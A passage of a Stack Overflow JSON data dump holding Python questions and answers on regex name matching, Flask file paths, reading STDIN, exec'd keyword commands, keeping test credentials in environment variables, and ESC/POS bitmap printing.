noreferrer\">gist.github.com/anonymous/d80acd4b5beaa10f77275d9ec0dfd976</a>"}, {"owner": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "edited": false, "score": 6, "creation_date": 1463002530, "post_id": 37173523, "comment_id": 61882015, "body": "<code>re.I</code> - wait, you&#39;re explicitly requesting that your regex ignore case. Why are you doing that?"}, {"owner": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 1, "creation_date": 1463002704, "post_id": 37173523, "comment_id": 61882082, "body": "@user92592 next time, please use the <a href=\"https://stackoverflow.com/posts/37173523/edit\">edit</a> function to add your code to your question - do not post code on external websites."}, {"owner": {"reputation": 233, "user_id": 5592910, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/41ef88686975b205709a4e3262ad72c0?s=128&d=identicon&r=PG&f=1", "display_name": "user92592", "link": "https://stackoverflow.com/users/5592910/user92592"}, "reply_to_user": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "edited": false, "score": 0, "creation_date": 1463003110, "post_id": 37173523, "comment_id": 61882260, "body": "@user2357112 you are correct, I did that out of habbit! Removing it did help solve the issue."}, {"owner": {"reputation": 233, "user_id": 5592910, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/41ef88686975b205709a4e3262ad72c0?s=128&d=identicon&r=PG&f=1", "display_name": "user92592", "link": "https://stackoverflow.com/users/5592910/user92592"}, "reply_to_user": {"reputation": 3621, "user_id": 6188402, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/a8bdb7cbe81f5544f0ddc6ded12a23f1?s=128&d=identicon&r=PG&f=1", "display_name": "Washington Guedes", "link": "https://stackoverflow.com/users/6188402/washington-guedes"}, "edited": false, "score": 0, "creation_date": 1463003189, "post_id": 37173523, "comment_id": 61882299, "body": "@user6188402 I tried this regex and it worked perfectly for the &quot;RoboCop Nakamoto&quot; case and also the others. This expression does give the desired result. :)  Thanks Everyone"}, {"owner": {"reputation": 3621, "user_id": 6188402, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/a8bdb7cbe81f5544f0ddc6ded12a23f1?s=128&d=identicon&r=PG&f=1", "display_name": "Washington Guedes", "link": "https://stackoverflow.com/users/6188402/washington-guedes"}, "edited": false, "score": 0, "creation_date": 1463003313, "post_id": 37173523, "comment_id": 61882340, "body": "Glad to hear that ;)"}], "answers": [{"tags": [], "owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "is_accepted": false, "score": 1, "last_activity_date": 1463002801, "creation_date": 1463002801, "answer_id": 37173743, "question_id": 37173523, "link": "https://stackoverflow.com/questions/37173523/trying-to-understand-python-regexs/37173743#37173743", "title": "Trying to understand Python Regex&#39;s", "body": "<p><code>re.I</code> means ignore case, so the explicit upper case class you used will match both upper and lower case anyway. Don't use <code>re.I</code>. Also, to match \"RoboCop\", you need to accept more than one capital letter in a name, so you probably want:</p>\n\n<pre><code>NameSearch = re.compile(r'\\b[A-Z][a-zA-Z]+\\sNakamoto\\b', re.VERBOSE)\n</code></pre>\n\n<p>or the like. This also uses <code>\\b</code> as a word boundary detector so you don't match partway through a string like <code>fooBar Nakamoto</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "reply_to_user": {"reputation": 16763, "user_id": 2749397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/rcNMz.png?s=128&g=1", "display_name": "gboffi", "link": "https://stackoverflow.com/users/2749397/gboffi"}, "edited": false, "score": 0, "creation_date": 1463003727, "post_id": 37173744, "comment_id": 61882513, "body": "@gboffi: Yar, without word anchors (<code>\\b</code>), this would match <code>roboCop Nakamoto</code> because it would ignore the <code>robo</code> and match <code>Cop Nakamoto</code>."}, {"owner": {"reputation": 48, "user_id": 4222968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1dbf9f57bf9def5aec3dd2d1a3af362?s=128&d=identicon&r=PG&f=1", "display_name": "Dennis Jacobfeuerborn", "link": "https://stackoverflow.com/users/4222968/dennis-jacobfeuerborn"}, "reply_to_user": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 0, "creation_date": 1463005089, "post_id": 37173744, "comment_id": 61883053, "body": "My answer actually worked but only because it was using re.match() instead of re.search() which indeed requires manual anchoring as @ShadowRanger correctly pointed out. I updated the answer accordingly."}], "tags": [], "owner": {"reputation": 48, "user_id": 4222968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1dbf9f57bf9def5aec3dd2d1a3af362?s=128&d=identicon&r=PG&f=1", "display_name": "Dennis Jacobfeuerborn", "link": "https://stackoverflow.com/users/4222968/dennis-jacobfeuerborn"}, "is_accepted": true, "score": 0, "last_activity_date": 1463005811, "last_edit_date": 1463005811, "creation_date": 1463002810, "answer_id": 37173744, "question_id": 37173523, "link": "https://stackoverflow.com/questions/37173523/trying-to-understand-python-regexs/37173744#37173744", "title": "Trying to understand Python Regex&#39;s", "body": "<p>Your regular expression actually works fine over here but it will not match the \"RoboCop Nakamoto\" case.</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>import re\n\ndef printMatch(name):\n    pat = re.compile(r'\\b[A-Z][a-zA-Z]+\\sNakamoto')\n    if pat.search(name):\n        print '\"'+name+'\" matches'\n    else:\n        print '\"'+name+'\" does not match'\n\nprintMatch('test satoshi Nakamoto test')\nprintMatch('test Satoshi Nakamoto test')\nprintMatch('test RoboCop Nakamoto test')\nprintMatch('test roboCop Nakamoto test')\n</code></pre>\n\n<p>The output is this:</p>\n\n<pre><code>\"test satoshi Nakamoto test\" does not match\n\"test Satoshi Nakamoto test\" matches\n\"test RoboCop Nakamoto test\" matches\n\"test roboCop Nakamoto test\" does not match\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 26, "user_id": 1426290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/10633b58b27d56aec1dfdf74afd38241?s=128&d=identicon&r=PG", "display_name": "BlackPioter", "link": "https://stackoverflow.com/users/1426290/blackpioter"}, "is_accepted": false, "score": 0, "last_activity_date": 1528843569, "creation_date": 1528843569, "answer_id": 50826863, "question_id": 37173523, "link": "https://stackoverflow.com/questions/37173523/trying-to-understand-python-regexs/50826863#50826863", "title": "Trying to understand Python Regex&#39;s", "body": "<p>The one that worked for me:</p>\n\n<pre><code>rgx = re.compile(r'^[A-Z]\\w+ Nakamoto')\n</code></pre>\n\n<p>You can check here: <a href=\"https://regex101.com/r/lNE320/1\" rel=\"nofollow noreferrer\">https://regex101.com/r/lNE320/1</a></p>\n"}], "owner": {"reputation": 233, "user_id": 5592910, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/41ef88686975b205709a4e3262ad72c0?s=128&d=identicon&r=PG&f=1", "display_name": "user92592", "link": "https://stackoverflow.com/users/5592910/user92592"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 805, "favorite_count": 0, "accepted_answer_id": 37173744, "answer_count": 3, "score": -2, "last_activity_date": 1539950196, "creation_date": 1463001788, "last_edit_date": 1539950196, "question_id": 37173523, "link": "https://stackoverflow.com/questions/37173523/trying-to-understand-python-regexs", "title": "Trying to understand Python Regex&#39;s", "body": "<p>I am trying to write a Python regex to capture the full name of someone whose last name is Nakamoto? You can assume that the first name that comes before it will always be one word that begins with a capital letter. The regex must match the following:</p>\n\n<pre><code>'Satoshi Nakamoto'\n'Alice Nakamoto'\n'RoboCop Nakamoto'\n</code></pre>\n\n<p>but not the following:</p>\n\n<pre><code>'satoshi Nakamoto' (where the first name is not capitalised)\n'Mr. Nakamoto' (where the preceding word has a nonletter character)\n'Nakamoto' (which has no first name)\n'Satoshi nakamoto' (where Nakamoto is not capitalised)\n</code></pre>\n\n<p>I have used the following regex: <code>[A-Z][a-z]+\\sNakamoto</code></p>\n\n<p>However this captures both <code>Satoshi Nakamoto</code> and <code>satoshi Nakamoto</code>. I would like to understand where I am going wrong and how to correct it. Here is my code:</p>\n\n<pre><code>import re    #import regular expressions\n\n#regular expression\nNameSearch = re.compile(r'[A-Z][a-z]+\\sNakamoto', re.I | re.VERBOSE)\n\n# perform search on string\nResult = NameSearch.search(\"Satoshi Nakamoto\")\n\n#Debug code to check if it found a match or not\nprint (Result == None)\n\nif Result != None:\n    print (Result.group())\n</code></pre>\n"}, {"tags": ["python", "flask", "urllib"], "answers": [{"tags": [], "owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "is_accepted": false, "score": 0, "last_activity_date": 1463006402, "creation_date": 1463006402, "answer_id": 37174450, "question_id": 37173450, "link": "https://stackoverflow.com/questions/37173450/flask-save-files-downloaded-with-url-retrieve-into-the-static-img-folder/37174450#37174450", "title": "Flask: Save files downloaded with URL retrieve into the static/img/ folder", "body": "<p>Remove the <code>/</code> at the beginning of your path to make it relative instead of absolute.</p>\n"}], "owner": {"reputation": 146, "user_id": 4837574, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/f840633522a8506d6dca1262751b4f9d?s=128&d=identicon&r=PG&f=1", "display_name": "moglido", "link": "https://stackoverflow.com/users/4837574/moglido"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 624, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1463006402, "creation_date": 1463001438, "question_id": 37173450, "link": "https://stackoverflow.com/questions/37173450/flask-save-files-downloaded-with-url-retrieve-into-the-static-img-folder", "title": "Flask: Save files downloaded with URL retrieve into the static/img/ folder", "body": "<p>Whenever I try to use <code>urllib.urlretrieve(href, '/static/img/'+filename)</code>, I get the error \"No such file or directory\". However, I do have that directory in there. </p>\n\n<p>If I remove the \"/static/img/\" the images download fine into the root folder. I need the images to go into the static/img folder to follow Flask convention.  </p>\n\n<p>How do I download images using urlretrieve into a directory that I set in Flask?</p>\n"}, {"tags": ["python", "linux", "python-2.7", "python-3.x", "ipython"], "comments": [{"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 1, "creation_date": 1463001583, "post_id": 37173381, "comment_id": 61881590, "body": "Googling &quot;python stdin&quot; would have answered this."}, {"owner": {"reputation": 16773, "user_id": 5827215, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s_pAOw1Sc-M/AAAAAAAAAAI/AAAAAAAAAMA/J-R1IMHbuY4/photo.jpg?sz=128", "display_name": "Tadhg McDonald-Jensen", "link": "https://stackoverflow.com/users/5827215/tadhg-mcdonald-jensen"}, "edited": false, "score": 0, "creation_date": 1463068776, "post_id": 37173381, "comment_id": 61916601, "body": "Quite frankly if you told your professor &quot;I don&#39;t know what STDIN means&quot; and the only response was &quot;you don&#39;t have to open a file like we generally do&quot; <b>That is not a helpful response at all!</b> the response should have been something like &quot;It is a file (more or less) that is opened before your program starts and can be accessed via <code>sys.stdin</code>&quot; That would have been significantly more helpful to you!"}], "answers": [{"tags": [], "owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "is_accepted": false, "score": 0, "last_activity_date": 1463001363, "creation_date": 1463001363, "answer_id": 37173430, "question_id": 37173381, "link": "https://stackoverflow.com/questions/37173381/stdin-file-read-query/37173430#37173430", "title": "STDIN file read query", "body": "<p><code>import sys</code>, then <code>sys.stdin</code> will be the 'file' you want which you can use like any other file (e.g. <code>sys.stdin.read()</code>), and you don't have to close it. <code>stdin</code> means \"standard input\".</p>\n"}, {"tags": [], "owner": {"reputation": 1188, "user_id": 920494, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/LtH1G.jpg?s=128&g=1", "display_name": "Monkeyanator", "link": "https://stackoverflow.com/users/920494/monkeyanator"}, "is_accepted": false, "score": 0, "last_activity_date": 1463003063, "last_edit_date": 1495541275, "creation_date": 1463002356, "answer_id": 37173648, "question_id": 37173381, "link": "https://stackoverflow.com/questions/37173381/stdin-file-read-query/37173648#37173648", "title": "STDIN file read query", "body": "<p>Might be helpful if you read through <a href=\"https://stackoverflow.com/questions/1450393/how-do-you-read-from-stdin-in-python\">this</a> post, which seems to be similar to yours. </p>\n\n<p>'stdin' in this case would be the argument on the command line coming after the python script, so <code>python script.py input_file</code>. This <strong>input_file</strong> would be the file containing whatever data you are working on. </p>\n\n<p>So, you're probably wondering how to read stdin. There are a couple of options. The one suggested in the thread linked above goes as follows: </p>\n\n<pre><code>import fileinput \nfor line in fileinput.input(): \n    #read data from file\n</code></pre>\n\n<p>There are other ways, of course, but I think I'll leave you to it. Check the linked post for more information. </p>\n\n<p>Depending on the context of your assignment, stdin may be automatically sent into the script, or you may have to do it manually as detailed above. </p>\n"}, {"tags": [], "owner": {"reputation": 16, "user_id": 5792089, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JkFrC.jpg?s=128&g=1", "display_name": "Yali", "link": "https://stackoverflow.com/users/5792089/yali"}, "is_accepted": true, "score": 0, "last_activity_date": 1463003075, "creation_date": 1463003075, "answer_id": 37173812, "question_id": 37173381, "link": "https://stackoverflow.com/questions/37173381/stdin-file-read-query/37173812#37173812", "title": "STDIN file read query", "body": "<p>The stdin takes input from different sources - depending on what input it gets. \nGiven a very simple bit of code for illustration (let's call it: script.py):</p>\n\n<pre><code>import sys\n\ntext = sys.stdin.read()\n\nprint text\n</code></pre>\n\n<p>You can either pipe your script with the input-file like so:</p>\n\n<pre><code>$ more file.txt | script.py\n</code></pre>\n\n<p>In this case, the output of the first part of the pipeline - which is the content of the file - is assigned to our variable(in this case text, which gets printed out eventually).</p>\n\n<p>When left empty (i.e. without any additional input) like so:</p>\n\n<pre><code>$ python script.py\n</code></pre>\n\n<p>It let's you write the input similar to the input function and assigns the written input to the defined variable(Note that this input-\"window\" is open until you explicitly close it, which is usually done with Ctrl+D).</p>\n"}], "owner": {"reputation": 5, "user_id": 4164169, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/186378fd56e3a0791d2aff249ec9808b?s=128&d=identicon&r=PG&f=1", "display_name": "Pukhraj Singh", "link": "https://stackoverflow.com/users/4164169/pukhraj-singh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 697, "favorite_count": 0, "closed_date": 1463068478, "accepted_answer_id": 37173812, "answer_count": 3, "score": -2, "last_activity_date": 1463003075, "creation_date": 1463001154, "last_edit_date": 1463002086, "question_id": 37173381, "link": "https://stackoverflow.com/questions/37173381/stdin-file-read-query", "closed_reason": "Duplicate", "title": "STDIN file read query", "body": "<p>I am doing small project in which I have to read the file from STDIN.\nI am not sure what it means, what I asked the professor he told me,\nthere is not need to open the file and close like we generally do.</p>\n\n<pre><code>sFile = open ( \"file.txt\",'r')\n</code></pre>\n\n<p>I dont have to pass the file as a argument.</p>\n\n<p>I am kind of confused what he wants.</p>\n"}, {"tags": ["python", "character", "artificial-intelligence", "symbols"], "comments": [{"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 4, "creation_date": 1463001231, "post_id": 37173338, "comment_id": 61881394, "body": "Use a more powerful, flexible, and well-established format to store your data, like JSON. Don&#39;t do hacks like this."}, {"owner": {"reputation": 37256, "user_id": 736308, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/o5EqQ.jpg?s=128&g=1", "display_name": "cdarke", "link": "https://stackoverflow.com/users/736308/cdarke"}, "edited": false, "score": 0, "creation_date": 1463001243, "post_id": 37173338, "comment_id": 61881401, "body": "Have you considered using an existing serialisation format, such as XML, YAML or JSON?  It might also be possible to use one of the <code>pickle</code> formats.  Having said that, the multi-byte symbols in Unicode are generally unused, a snowman for instance."}], "answers": [{"comments": [{"owner": {"reputation": 23605, "user_id": 1016216, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/xF5Ew.png?s=128&g=1", "display_name": "L3viathan", "link": "https://stackoverflow.com/users/1016216/l3viathan"}, "reply_to_user": {"reputation": 37256, "user_id": 736308, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/o5EqQ.jpg?s=128&g=1", "display_name": "cdarke", "link": "https://stackoverflow.com/users/736308/cdarke"}, "edited": false, "score": 0, "creation_date": 1463001526, "post_id": 37173438, "comment_id": 61881563, "body": "@cdarke Which are string literals."}, {"owner": {"reputation": 3424, "user_id": 3750257, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KF8gx.png?s=128&g=1", "display_name": "pppery", "link": "https://stackoverflow.com/users/3750257/pppery"}, "edited": false, "score": 0, "creation_date": 1463001581, "post_id": 37173438, "comment_id": 61881587, "body": "In addition, they  can be escaped as <code>\\x24</code> and <code>\\x3f</code> respectively."}], "tags": [], "owner": {"reputation": 3424, "user_id": 3750257, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KF8gx.png?s=128&g=1", "display_name": "pppery", "link": "https://stackoverflow.com/users/3750257/pppery"}, "is_accepted": false, "score": 0, "last_activity_date": 1483114877, "last_edit_date": 1483114877, "creation_date": 1463001405, "answer_id": 37173438, "question_id": 37173338, "link": "https://stackoverflow.com/questions/37173338/are-there-any-unused-symbols-in-python/37173438#37173438", "title": "Are there any unused symbols in python?", "body": "<p>According to <a href=\"https://docs.python.org/2/reference/lexical_analysis.html#delimiters\" rel=\"nofollow noreferrer\">the documentation on literals</a>, The <code>$</code> and <code>?</code> characters are not used in Python for any purpose other than string literals and comments.</p>\n"}, {"tags": [], "owner": {"reputation": 28245, "user_id": 1547004, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5255289d0269d550a4e80e6bf6b0f590?s=128&d=identicon&r=PG", "display_name": "Brendan Abel", "link": "https://stackoverflow.com/users/1547004/brendan-abel"}, "is_accepted": true, "score": 1, "last_activity_date": 1463002314, "last_edit_date": 1495541329, "creation_date": 1463002314, "answer_id": 37173639, "question_id": 37173338, "link": "https://stackoverflow.com/questions/37173338/are-there-any-unused-symbols-in-python/37173639#37173639", "title": "Are there any unused symbols in python?", "body": "<p>Well, python supports multiple expressions/statements on a single line using a semi-colon <code>;</code></p>\n\n<pre><code>a = 1; b = 2; c = a + b; print c\n</code></pre>\n\n<p>So, you don't need to create your own newline symbol to handle multiline python scripts.  That being said, you should probably not do this.</p>\n\n<p>You're essentially creating a somewhat limited plugin architecture.  People have done this before.  There are <strong>lots</strong> of <a href=\"https://stackoverflow.com/q/932069/1547004\">options for doing this in python</a>.  I can just imagine the amount of frustration someone could have looking at one of your \"plugin\" files with dozens of commands, each with a 30 line python script on a single line.</p>\n"}], "owner": {"reputation": 3, "user_id": 6322491, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-otEzZYqLUII/AAAAAAAAAAI/AAAAAAAAGgY/52VHte8WfvY/photo.jpg?sz=128", "display_name": "Zach Champion", "link": "https://stackoverflow.com/users/6322491/zach-champion"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 570, "favorite_count": 0, "accepted_answer_id": 37173639, "answer_count": 2, "score": 0, "last_activity_date": 1483114877, "creation_date": 1463000935, "question_id": 37173338, "link": "https://stackoverflow.com/questions/37173338/are-there-any-unused-symbols-in-python", "title": "Are there any unused symbols in python?", "body": "<p>I am writing an AI that runs commands off of text file modules. In the folder in which my python program is located are a group of text files. They each have sets of keyword-command sets formatted like this:</p>\n\n<p><em>keyword 1,function 1|keyword 2,function 2</em></p>\n\n<p>My program loops through all these files and creates a list of keyword-command sets. For example, from 2 text files, </p>\n\n<p><em>keyword 1,function 1|keyword 2,function 2</em> and <em>keyword 3,function 3</em>,</p>\n\n<p>the list generated is</p>\n\n<p><em>[['keyword 1', 'function 1'], ['keyword 2', 'function 2'], ['keyword 3', 'function 3']]</em>.</p>\n\n<p>Now the <em>function</em> portions are commands run via the <em>exec</em> command, but I would like to have the ability to execute multiple lines of code for each function. I am thinking I will accomplish this by adding a special symbol to symbolize a new line and add the commands to a list, then iterate through them. My question is are there any symbol I could safely use that won't mess up any other commands that may use those symbols? For example, if I use <em>%</em>, it would mess up the modulo command.</p>\n\n<p>Here is my code as of now in case you need it, although I don't really think you would.</p>\n\n<pre><code># Setup\nimport os\nimport locale\n\n# Load modules\nfunctions = []\nprint(str(os.getcwd()))\nprint(str(os.getcwd().replace('ZAAI.py', '')))\nfor file in os.listdir(os.getcwd().replace('ZAAI.py', '')):\n    if file.endswith('.txt'):\n        openFile = open(os.getcwd().replace('ZAAI.py', '') + file, encoding=locale.getpreferredencoding())\n        openFileText = openFile.read()\n        print(openFileText)\n        for item in openFileText.split('|'):\n            functions.append(item.split(','))\nprint(functions)\n</code></pre>\n"}, {"tags": ["python", "unit-testing", "testing", "nose"], "comments": [{"owner": {"reputation": 10100, "user_id": 590028, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/43c6ce77252e438b40b96f5c68cf3432?s=128&d=identicon&r=PG", "display_name": "user590028", "link": "https://stackoverflow.com/users/590028/user590028"}, "edited": false, "score": 0, "creation_date": 1463000593, "post_id": 37173182, "comment_id": 61881059, "body": "The answer is -- it depends. Can you describe what your testing?"}, {"owner": {"reputation": 2912, "user_id": 923797, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/5a3168b82ab435b01767d070b74a7c96?s=128&d=identicon&r=PG", "display_name": "cjohnson318", "link": "https://stackoverflow.com/users/923797/cjohnson318"}, "reply_to_user": {"reputation": 10100, "user_id": 590028, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/43c6ce77252e438b40b96f5c68cf3432?s=128&d=identicon&r=PG", "display_name": "user590028", "link": "https://stackoverflow.com/users/590028/user590028"}, "edited": false, "score": 0, "creation_date": 1463005902, "post_id": 37173182, "comment_id": 61883351, "body": "The class needs to be initialized with a username and password in order to access an API on the web."}], "answers": [{"tags": [], "owner": {"reputation": 10401, "user_id": 681044, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/OWZ3c.jpg?s=128&g=1", "display_name": "kwarunek", "link": "https://stackoverflow.com/users/681044/kwarunek"}, "is_accepted": true, "score": 1, "last_activity_date": 1463123100, "last_edit_date": 1592644375, "creation_date": 1463009854, "answer_id": 37174950, "question_id": 37173182, "link": "https://stackoverflow.com/questions/37173182/how-to-provide-a-sensitive-data-to-nose/37174950#37174950", "title": "How to provide a sensitive data to nose", "body": "<p>Most common options is to provide data in env variables.</p>\n<pre><code>import os\n\npassword = os.environ['PASSWORD']\nusername = os.environ['USERNAME']\n</code></pre>\n<p><code>$ USERNAME=user PASSWORD=qwerty nose</code></p>\n<p>Note: Environment variables can be read by root and process owner. Variables provided via command line appear in shell history with the command.</p>\n<h2>Manual tests</h2>\n<ul>\n<li>encourage (enforce) developers to obtain their own credentials,</li>\n<li>encrypt credentials; among others I would take a look at <a href=\"https://sobolevn.github.io/git-secret/\" rel=\"nofollow noreferrer\">git-secret</a>. Tox could be used to automate this a bit.</li>\n</ul>\n<h2>Automated tests</h2>\n<p>Most CI systems offer option (internally or via plugin) to store and pass credentials to test/build plans, mask them in logs. For example <a href=\"https://jenkins.io/\" rel=\"nofollow noreferrer\">Jenkins</a> has numerous plugins <a href=\"https://wiki.jenkins-ci.org/display/JENKINS/Credentials+Binding+Plugin\" rel=\"nofollow noreferrer\">Mask Password</a>, <a href=\"https://wiki.jenkins-ci.org/display/JENKINS/Credentials+Binding+Plugin\" rel=\"nofollow noreferrer\">Credentials Binding</a>. Atlassian's Bamboo by default masks all plan variables if name has <code>password</code> word. Personally, I found the most useful are Travis' <a href=\"https://docs.travis-ci.com/user/environment-variables/#Encrypted-Variables\" rel=\"nofollow noreferrer\">encrypted variables</a>, credentials are tied to repo/commit, not to plan.</p>\n"}], "owner": {"reputation": 2912, "user_id": 923797, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/5a3168b82ab435b01767d070b74a7c96?s=128&d=identicon&r=PG", "display_name": "cjohnson318", "link": "https://stackoverflow.com/users/923797/cjohnson318"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 111, "favorite_count": 0, "accepted_answer_id": 37174950, "answer_count": 1, "score": 0, "last_activity_date": 1463123100, "creation_date": 1463000340, "question_id": 37173182, "link": "https://stackoverflow.com/questions/37173182/how-to-provide-a-sensitive-data-to-nose", "title": "How to provide a sensitive data to nose", "body": "<p>I am using nose to test a Python class that requires a username and password. What is the best practice for providing that username and password pair to the test module? I'd like the testing process to be intuitive for another engineer to pick up, and I cannot store any sensitive information in cleartext. Any ideas?</p>\n"}, {"tags": ["python", "python-2.7", "printing"], "comments": [{"owner": {"reputation": 587, "user_id": 830621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6a3cc28a3fa7fb2727909ecf7a4a3ed7?s=128&d=identicon&r=PG", "display_name": "tjollans", "link": "https://stackoverflow.com/users/830621/tjollans"}, "edited": false, "score": 0, "creation_date": 1463000964, "post_id": 37173162, "comment_id": 61881260, "body": "You appear to have some reasonable-sounding educated guesses as to what you have to do. Have you actually tried printing a bitmap based on your current understanding of the interface?"}, {"owner": {"reputation": 1, "user_id": 6322183, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a612788bd99c0fecaa9bb5202ad1066a?s=128&d=identicon&r=PG&f=1", "display_name": "Vora-vita", "link": "https://stackoverflow.com/users/6322183/vora-vita"}, "reply_to_user": {"reputation": 587, "user_id": 830621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6a3cc28a3fa7fb2727909ecf7a4a3ed7?s=128&d=identicon&r=PG", "display_name": "tjollans", "link": "https://stackoverflow.com/users/830621/tjollans"}, "edited": false, "score": 0, "creation_date": 1463004221, "post_id": 37173162, "comment_id": 61882715, "body": "Yeah, unfortunately, it seems to fail to print.  But without python errors, so that&#39;s good.  I think my string is formatted wrong, but without a working example, I&#39;m just guessing my way to failure.  :(  I don&#39;t think actual .bmp&#39;s are formatted properly for what I&#39;m doing here."}], "owner": {"reputation": 1, "user_id": 6322183, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a612788bd99c0fecaa9bb5202ad1066a?s=128&d=identicon&r=PG&f=1", "display_name": "Vora-vita", "link": "https://stackoverflow.com/users/6322183/vora-vita"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 678, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1463019228, "creation_date": 1463000274, "last_edit_date": 1463019228, "question_id": 37173162, "link": "https://stackoverflow.com/questions/37173162/python-print-image-bit-data-to-a-esc-pos-printer-with-python", "title": "Python - print image bit data to a ESC/POS printer with python", "body": "<p>I've been looking for an example of how to format and print bmp's to my receipt printer (so I can add logos) for a long time, so I doubt this is a duplicate post considering others were for java or other script languages.  Usually I'm pretty good at understanding instructions, but all I seem to find is the same old instructions I can never fully understand.</p>\n\n<p>I am using python 2.7 and I have a function pI(x) which uses win32print to send data to the printer, where x is the data in string format using \"\\x??\" for hex data like formatting text.  It seems to work well.</p>\n\n<p>The programmer manual that came with my printer says (for downloading bit image, GS *) for syntax:</p>\n\n<pre><code>Hex   1D 2A x y d1...dk\n</code></pre>\n\n<p>and:</p>\n\n<pre><code>d=1 for printing the corresponding dot and d=0 for not printing the corresponding dot.\n</code></pre>\n\n<p>Here is my questions about these instructions:</p>\n\n<p>Does this mean that all x, y, d1...dk is in hex (or \"\\x??\")?  I think so.</p>\n\n<p>What is x and y representing?  I read a while ago on a site (maybe this one) that x+y*255 = image width, and I assume that is using the order of operations.  Is this correct?</p>\n\n<p>The instructions on my generic printer also state that x and y are both supposed to be between 1 and 48, totaling no more than 1500, unlike some manuals which say x is supposed to be between 0 and 3 and y being between 1 and 128 (I think) which said x+y*255=width, totaling about 2000.  it also says k=x*y*8 which I think that the example would be 8*8*8=512*\"\\x01\", so where does the third 8 come from 